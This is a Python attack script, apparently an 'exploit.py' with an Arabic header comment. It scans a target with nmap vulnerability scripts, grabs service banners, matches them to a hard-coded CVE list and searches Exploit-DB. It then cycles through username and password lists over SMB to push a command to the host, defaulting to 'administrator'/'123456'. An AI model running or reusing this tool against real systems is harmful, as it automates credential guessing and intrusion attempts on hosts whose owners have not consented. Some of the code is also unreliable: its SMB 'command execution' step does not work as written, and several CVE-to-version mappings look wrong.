# الكود الجديد الكامل لملف exploit.py مع دعم اسم المستخدم/كلمة المرور أو ملفات تحتوي على قائمة منهم

import os
import subprocess
import json
import socket
from datetime import datetime
from impacket.smbconnection import SMBConnection

# تحديد نوع الجهاز من MAC Address
def identify_vendor(ip, oui_path='config/oui.txt'):
    try:
        result = subprocess.check_output(['nmap', '-sn', ip], stderr=subprocess.DEVNULL).decode()
        mac_line = next((line for line in result.splitlines() if "MAC Address" in line), None)
        if not mac_line:
            return {"mac_address": "N/A", "vendor": "Unknown", "nmap_scan": result}
        mac_address = mac_line.split("MAC Address:")[1].split(" ")[1].strip()
        mac_prefix = ":".join(mac_address.split(":")[:3]).upper()
        vendor = "Unknown"
        with open(oui_path) as f:
            for line in f:
                if mac_prefix.replace(":", "").lower() in line.lower():
                    vendor = line.split("\t")[-1].strip()
                    break
        return {
            "mac_address": mac_address,
            "vendor": vendor,
            "nmap_scan": result
        }
    except Exception as e:
        return {"error": f"MAC vendor detection failed: {str(e)}"}

def check_smb_vuln(ip):
    print(f"[*] Checking SMB vulnerabilities on {ip}...")
    try:
        result = subprocess.check_output(['nmap', '-p445', '--script', 'smb-vuln*', ip], stderr=subprocess.DEVNULL).decode()
        return {"smb_vuln_check": result}
    except Exception as e:
        return {"error": f"SMB check failed: {str(e)}"}

def check_http_vuln(ip):
    print(f"[*] Checking HTTP vulnerabilities on {ip}...")
    try:
        result = subprocess.check_output(['nmap', '-p80,443', '--script', 'http-vuln*', ip], stderr=subprocess.DEVNULL).decode()
        return {"http_vuln_check": result}
    except Exception as e:
        return {"error": f"HTTP check failed: {str(e)}"}

def check_ftp_vuln(ip):
    print(f"[*] Checking FTP vulnerabilities on {ip}...")
    try:
        result = subprocess.check_output(['nmap', '-p21', '--script', 'ftp-vuln*', ip], stderr=subprocess.DEVNULL).decode()
        return {"ftp_vuln_check": result}
    except Exception as e:
        return {"error": f"FTP check failed: {str(e)}"}

def check_ssh_banner(ip):
    print(f"[*] Checking SSH banner on {ip}...")
    try:
        result = subprocess.check_output(['nmap', '-p22', '--script', 'ssh2-enum-algos,ssh-hostkey', ip], stderr=subprocess.DEVNULL).decode()
        return {"ssh_info": result}
    except Exception as e:
        return {"error": f"SSH check failed: {str(e)}"}

def grab_banner(ip, port=80):
    print(f"[*] Grabbing banner from {ip}:{port}")
    try:
        s = socket.socket()
        s.settimeout(2)
        s.connect((ip, port))
        banner = s.recv(1024).decode(errors='ignore').strip()
        s.close()
        return banner
    except Exception as e:
        return f"Error: {str(e)}"

def check_known_cves(banner):
    print(f"[*] Checking known CVEs in banner...")
    known = {
        "Apache/2.2.8": "CVE-2009-1195",
        "OpenSSH_7.2p2": "CVE-2016-0777",
        "vsFTPd 2.3.4": "CVE-2011-2523",
        "GoAhead": "CVE-2017-17562",
        "Boa": "CVE-2022-27226"
    }
    for keyword in known:
        if keyword.lower() in banner.lower():
            return {"cve": known[keyword], "product": keyword}
    return {"cve": None}

def search_exploitdb(query):
    print(f"[*] Searching Exploit-DB for: {query}")
    try:
        result = subprocess.check_output(['searchsploit', '--json', query], stderr=subprocess.DEVNULL).decode()
        json_data = json.loads(result)
        return {"exploitdb": json_data.get("RESULTS_EXPLOIT", [])}
    except Exception as e:
        return {"exploitdb_error": str(e)}

def smb_exec_command(ip, usernames, passwords, domain='', command='whoami'):
    print(f"[*] Trying SMB exec on {ip} with given credentials...")
    results = []
    for username in usernames:
        for password in passwords:
            try:
                smb = SMBConnection(ip, ip)
                smb.login(username, password, domain)
                tid = smb.connectTree('IPC$')
                fid = smb.openFile(tid, 'cmd', desiredAccess=0x2019F)
                smb.writeFile(tid, fid, command.encode())
                smb.closeFile(tid, fid)
                smb.logoff()
                results.append({"username": username, "password": password, "status": "Command sent successfully"})
                return results  # نرجع أول واحدة ناجحة فقط
            except Exception as e:
                results.append({"username": username, "password": password, "error": str(e)})
    return results

def run_exploit_tests(ip, usernames, passwords):
    print(f"[+] Running exploit scans on: {ip}")
    results = {}

    results["device_info"] = identify_vendor(ip)
    results["smb"] = check_smb_vuln(ip)
    results["http"] = check_http_vuln(ip)
    results["ftp"] = check_ftp_vuln(ip)
    results["ssh"] = check_ssh_banner(ip)

    banner_http = grab_banner(ip, 80)
    results["http_banner"] = banner_http
    results["cve_match"] = check_known_cves(banner_http)

    results["exploitdb_search"] = search_exploitdb(banner_http or ip)
    results["smb_exec_test"] = smb_exec_command(ip, usernames, passwords)

    return results

def save_results(results):
    os.makedirs("output", exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    filename = f"output/exploit-{timestamp}.json"
    with open(filename, "w") as f:
        json.dump(results, f, indent=4)
    print(f"[+] Exploit scan results saved to {filename}")

def run(target, usernames=None, passwords=None):
    usernames = usernames or ["administrator"]
    passwords = passwords or ["123456"]
    results = run_exploit_tests(target, usernames, passwords)
    save_results(results)

